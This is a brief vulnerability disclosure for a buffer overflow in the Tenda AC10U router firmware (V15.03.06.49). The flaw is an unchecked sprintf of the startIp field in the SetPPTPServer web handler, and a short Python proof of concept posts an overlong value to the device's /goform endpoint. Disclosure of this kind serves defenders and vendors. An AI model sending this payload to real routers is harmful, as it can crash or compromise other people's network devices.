# buff overflow

## Tenda_AC10U_V1

version: V15.03.06.49

## Description:

There is a buff overflow in httpd/formSetPPTPServer

## Source:

you may download it from : https://www.tendacn.com/download/detail-3795.html

## Analyse:


![](../Tenda_AC6_v2/6.png)

get value from startIp ,then call sprintf, cause buff overflow

![](../Tenda_AC6_v2/7.png)


## POC
```
url = "http://192.168.1.13/goform/SetPPTPServer"
payload = 'A'*0x1000 + '\n'

r = requests.post(url, data={'startIp': payload})
``` 
